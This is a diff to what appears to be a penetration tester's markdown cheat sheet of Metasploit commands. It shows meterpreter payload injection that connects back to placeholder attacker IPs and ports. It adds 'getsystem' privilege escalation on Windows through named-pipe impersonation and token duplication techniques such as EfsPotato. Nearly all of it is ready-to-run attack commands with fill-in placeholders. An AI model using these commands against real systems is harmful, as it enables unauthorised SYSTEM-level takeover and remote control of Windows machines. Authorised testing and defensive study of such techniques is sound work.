@@ -146,7 +146,7 @@ use post/windows/manage/multi_meterpreter_inject
 run AMOUNT=<2>,HANDLER=<true>,SESSION=<1>,IPLIST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port> <ip>
 ```
 
-# Spawn a new process and initiate a new meterpreter session
+# Spawn a new process and initiate a new meterpreter session from it
 ## Options
 ```ruby
 use exploit/windows/local/payload_inject
@@ -161,4 +161,32 @@ set LPORT <payload_connect_to_port>
 ## Run
 ```ruby
 run -o AUTOUNHOOK=<true>,SESSION=<1>,<payload_connect_to_ips>,LPORT=<payload_connect_to_port> <ip>
+```
+
+# Get system
+## Meterpreter
+```ruby
+# Per 2022-10-19
+#    -t   The technique to use. (Default to '0').
+#                0 : All techniques available
+#                1 : Named Pipe Impersonation (In Memory/Admin)
+#                2 : Named Pipe Impersonation (Dropper/Admin)
+#                3 : Token Duplication (In Memory/Admin)
+#                4 : Named Pipe Impersonation (RPCSS variant)
+#                5 : Named Pipe Impersonation (PrintSpooler variant)
+#                6 : Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
+getsystem -t <6>
+```
+
+## Options
+```ruby
+use post/windows/escalate/getsystem
+set SESSION <1>
+set TECHNIQUE <6>
+```
+
+# Run
+```ruby
+use post/windows/escalate/getsystem
+run -o SESSION=<1>,TECHNIQUE=<6>
 ```
